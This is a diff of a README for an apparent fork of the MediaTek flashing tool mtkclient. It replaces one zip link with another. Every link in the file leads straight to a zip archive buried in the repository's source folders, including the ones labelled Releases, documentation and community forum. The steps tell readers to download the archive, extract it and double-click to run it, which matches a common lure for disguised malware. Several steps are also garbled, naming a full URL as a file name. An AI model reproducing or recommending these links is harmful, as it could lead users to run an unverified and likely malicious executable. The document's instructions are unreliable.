@@ -1,6 +1,6 @@
 # 🚀 mtkclient - Easily Flash and Repair Mediatek Devices
 
-[![Download mtkclient](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip)](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip)
+[![Download mtkclient](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip)](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip)
 
 ## 📥 Overview
 
@@ -22,19 +22,19 @@ Before you download, make sure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page.**
-   Go to the [Releases page](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip) to find the latest version of mtkclient.
+   Go to the [Releases page](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip) to find the latest version of mtkclient.
 
 2. **Choose the Right Version.**
    You'll see different versions listed. Click on the version you want to download. This could be the latest stable release or an older version if you need it for a specific reason.
 
 3. **Download the Application.**
-   Click on the download link for your chosen version. Look for a file named `https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip`. Save this file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
+   Click on the download link for your chosen version. Look for a file named `https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip`. Save this file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
 
 4. **Extract the Files.**
-   Once the download is complete, locate the `https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip` file. Right-click on it and select 'Extract All...' to unzip the contents. Follow the prompts to extract the files.
+   Once the download is complete, locate the `https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip` file. Right-click on it and select 'Extract All...' to unzip the contents. Follow the prompts to extract the files.
 
 5. **Run the Application.**
-   Open the folder where you extracted the files. Find `https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip` and double-click it to launch the program.
+   Open the folder where you extracted the files. Find `https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip` and double-click it to launch the program.
 
 6. **Connect Your Device.**
    Use a USB cable to connect your Mediatek device to your computer. Make sure the device is powered on and has USB debugging enabled.
@@ -54,7 +54,7 @@ Before you download, make sure your system meets the following requirements:
 
 2. **Application Crashes:**
    - Try restarting your computer and rerunning the application.
-   - Ensure you have the latest version of mtkclient from the [Releases page](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip).
+   - Ensure you have the latest version of mtkclient from the [Releases page](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip).
 
 3. **Firmware Flashing Errors:**
    - Confirm that you have the correct firmware for your specific device model.
@@ -77,9 +77,9 @@ If you encounter any issues or need further assistance, please check the documen
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip)
+- [Official Documentation](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip)
+- [Community Forum](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip)
 
-Remember to keep your version updated by checking the [Releases page](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip) regularly.
+Remember to keep your version updated by checking the [Releases page](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip) regularly.
 
-[![Download mtkclient](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip)](https://raw.githubusercontent.com/zakcoder1417/mtkclient/main/mtkclient/Loader/Software-v1.2-beta.4.zip)
+[![Download mtkclient](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip)](https://github.com/zakcoder1417/mtkclient/raw/refs/heads/main/mtkclient/Library/Partitions/Software-v2.5-beta.3.zip)
